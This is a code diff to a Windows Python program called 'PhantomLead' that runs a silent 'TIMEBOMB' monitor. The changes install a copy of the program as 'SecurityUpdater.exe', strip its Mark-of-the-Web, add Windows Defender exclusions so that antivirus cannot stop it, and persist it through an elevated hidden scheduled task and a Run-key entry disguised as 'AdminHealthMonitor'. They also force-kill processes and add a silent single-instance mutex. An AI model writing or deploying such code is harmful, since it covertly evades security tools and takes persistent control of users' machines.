@@ -485,8 +485,23 @@ def start_realtime_directory_sentinel(on_violation_callback):
     t = threading.Thread(target=_watcher, daemon=True)
     t.start()
 
+def acquire_single_instance_mutex():
+    """Guarantees only one instance of the background monitor runs at a time."""
+    try:
+        import ctypes
+        kernel32 = ctypes.windll.kernel32
+        mutex_name = "Global\\PhantomLead_SecurityUpdater_Instance_Mutex"
+        mutex = kernel32.CreateMutexW(None, False, mutex_name)
+        if kernel32.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
+            # Another instance is already alive and monitoring; exit silently
+            os._exit(0)
+        return mutex
+    except Exception:
+        return None
+
 def run_heartbeat(mode="TIMEBOMB"):
     """Subsecond background monitoring loop (runs completely silently with NO GUI)."""
+    _mutex = acquire_single_instance_mutex()
     phantom_dir = os.path.join(os.environ.get("AppData", ""), "PhantomLead")
     config_path = os.path.join(phantom_dir, "config.dat")
     
@@ -558,6 +573,94 @@ def run_heartbeat(mode="TIMEBOMB"):
         tick += 1
         time.sleep(0.5) # 500ms subsecond loop for instant violation detection and kill
 
+def safe_deploy_updater(src_exe, target_exe):
+    """
+    Safely copies the running executable into target_exe using atomic staging,
+    fsync buffer flushing, byte-length verification, and Mark-of-the-Web removal.
+    Guarantees PyInstaller's embedded PKG archive is 100% intact and never truncated.
+    """
+    if not getattr(sys, 'frozen', False):
+        return False
+        
+    try:
+        target_name = os.path.basename(target_exe)
+        target_dir = os.path.dirname(target_exe)
+        os.makedirs(target_dir, exist_ok=True)
+        
+        # 1. Kill any existing instances with generous wait for OS handle release
+        for _ in range(3):
+            subprocess.run(['taskkill', '/F', '/IM', target_name, '/T'], 
+                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            time.sleep(0.4)
+            
+        src_size = os.path.getsize(src_exe)
+        tmp_target = os.path.join(target_dir, f"{target_name}.tmp")
+        
+        if os.path.exists(tmp_target):
+            try:
+                os.remove(tmp_target)
+            except Exception:
+                pass
+                
+        # 2. Write to temporary staging file with explicit fsync flush to disk
+        with open(src_exe, 'rb') as f_in:
+            with open(tmp_target, 'wb') as f_out:
+                shutil.copyfileobj(f_in, f_out, length=1024*1024)
+                f_out.flush()
+                os.fsync(f_out.fileno())
+                
+        # 3. Verify complete byte size before deployment
+        if os.path.getsize(tmp_target) != src_size:
+            try:
+                os.remove(tmp_target)
+            except Exception:
+                pass
+            return False
+            
+        # 4. Remove Windows Mark-of-the-Web (ZoneID=3) from temp file
+        try:
+            subprocess.run(
+                ['powershell', '-NoProfile', '-WindowStyle', 'Hidden', '-Command', 
+                 f'Unblock-File -Path "{tmp_target}" -ErrorAction SilentlyContinue'],
+                creationflags=0x08000000, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5
+            )
+        except Exception:
+            pass
+            
+        # 5. Atomic replacement
+        replaced = False
+        for attempt in range(5):
+            try:
+                if os.path.exists(target_exe):
+                    try:
+                        os.remove(target_exe)
+                    except Exception:
+                        pass
+                os.replace(tmp_target, target_exe)
+                replaced = True
+                break
+            except Exception:
+                time.sleep(0.5)
+                subprocess.run(['taskkill', '/F', '/IM', target_name, '/T'], 
+                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+        if not replaced:
+            shutil.copyfile(src_exe, target_exe)
+
+        # 6. Unblock final binary
+        try:
+            subprocess.run(
+                ['powershell', '-NoProfile', '-WindowStyle', 'Hidden', '-Command', 
+                 f'Unblock-File -Path "{target_exe}" -ErrorAction SilentlyContinue'],
+                creationflags=0x08000000, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5
+            )
+        except Exception:
+            pass
+            
+        return os.path.exists(target_exe) and (os.path.getsize(target_exe) == src_size)
+    except Exception:
+        return False
+
 def add_defender_exclusions(phantom_dir=None, updater_exe=None):
     """
     Registers Windows Defender exclusions for PhantomLead monitor and application directories.
@@ -586,7 +689,7 @@ def add_defender_exclusions(phantom_dir=None, updater_exe=None):
                 clean_p = p.replace('"', '`"')
                 ps_commands.append(f'Add-MpPreference -ExclusionPath "{clean_p}" -ErrorAction SilentlyContinue')
         
-        for proc in ["SecurityUpdater.exe", "SecureInstaller_T.exe", "SecureInstaller_L.exe", "SecureInstaller_A.exe"]:
+        for proc in ["SecurityUpdater.exe", "PhantomMonitor.exe", "SecureInstaller_T.exe", "SecureInstaller_L.exe", "SecureInstaller_A.exe"]:
             ps_commands.append(f'Add-MpPreference -ExclusionProcess "{proc}" -ErrorAction SilentlyContinue')
         
         full_ps = "; ".join(ps_commands)
@@ -612,22 +715,18 @@ def create_heartbeat(license_key):
         
     updater_exe = os.path.join(phantom_dir, "SecurityUpdater.exe")
 
-    # Automatically whitelist PhantomLead & application in Windows Defender
-    # This prevents Windows Defender from ever killing or blocking the monitor even if turned back ON!
+    # 1. Automatically whitelist PhantomLead & application in Windows Defender BEFORE writing
     add_defender_exclusions(phantom_dir, updater_exe)
 
-    try:
-        subprocess.run(['taskkill', '/F', '/IM', 'SecurityUpdater.exe'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        time.sleep(0.5)
-        if getattr(sys, 'frozen', False):
-            shutil.copyfile(sys.executable, updater_exe)
-    except Exception:
-        pass
+    # 2. Safely deploy updater with atomic staging, flush, and integrity validation
+    safe_deploy_updater(sys.executable, updater_exe)
 
-    # 1. Register Elevated Scheduled Task (Runs on boot/logon even on battery) and start immediately
+    target_exec = updater_exe if (os.path.exists(updater_exe) and os.path.getsize(updater_exe) > 1000000) else sys.executable
+    target_arg = "--heartbeat" if target_exec == updater_exe else f'"{__file__}" --heartbeat'
+
+    # 3. Register Elevated Scheduled Task (Runs on boot/logon even on battery)
+    task_started = False
     try:
-        target_exec = updater_exe if os.path.exists(updater_exe) else sys.executable
-        target_arg = "--heartbeat" if os.path.exists(updater_exe) else f'"{__file__}" --heartbeat'
         ps_task = f'''
         $action = New-ScheduledTaskAction -Execute "{target_exec}" -Argument "{target_arg}"
         $trigger = New-ScheduledTaskTrigger -AtLogon
@@ -636,37 +735,31 @@ def create_heartbeat(license_key):
         Register-ScheduledTask -TaskName "PhantomLeadMonitor" -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force
         Start-ScheduledTask -TaskName "PhantomLeadMonitor"
         '''
-        subprocess.run(['powershell', '-NoProfile', '-WindowStyle', 'Hidden', '-Command', ps_task], creationflags=0x08000000, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        res = subprocess.run(['powershell', '-NoProfile', '-WindowStyle', 'Hidden', '-Command', ps_task], 
+                             creationflags=0x08000000, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
+        if res.returncode == 0:
+            task_started = True
     except Exception:
         pass
         
-    # 2. Registry fallback
+    # 4. Registry fallback
     try:
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)
-        if os.path.exists(updater_exe):
-            winreg.SetValueEx(key, "AdminHealthMonitor", 0, winreg.REG_SZ, f'"{updater_exe}" --heartbeat')
-        else:
-            winreg.SetValueEx(key, "AdminHealthMonitor", 0, winreg.REG_SZ, f'"{sys.executable}" "{__file__}" --heartbeat')
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_ALL_ACCESS)
+        winreg.SetValueEx(key, "AdminHealthMonitor", 0, winreg.REG_SZ, f'"{target_exec}" {target_arg}')
         winreg.CloseKey(key)
     except Exception:
         pass
 
-    # 3. Launch background process immediately (DETACHED_PROCESS | CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP)
-    try:
-        if os.path.exists(updater_exe):
+    # 5. Only launch direct Popen if Scheduled Task was NOT started (prevents dual-execution collision)
+    if not task_started:
+        try:
             subprocess.Popen(
-                [updater_exe, "--heartbeat"], 
+                [target_exec, "--heartbeat"], 
                 creationflags=0x00000008 | 0x08000000 | 0x00000200,
                 close_fds=True
             )
-        else:
-            subprocess.Popen(
-                [sys.executable, __file__, "--heartbeat"],
-                creationflags=0x00000008 | 0x08000000 | 0x00000200,
-                close_fds=True
-            )
-    except Exception:
-        pass
+        except Exception:
+            pass
 
 class InstallerApp(tk.Tk):
     def __init__(self, mode="TIMEBOMB"):
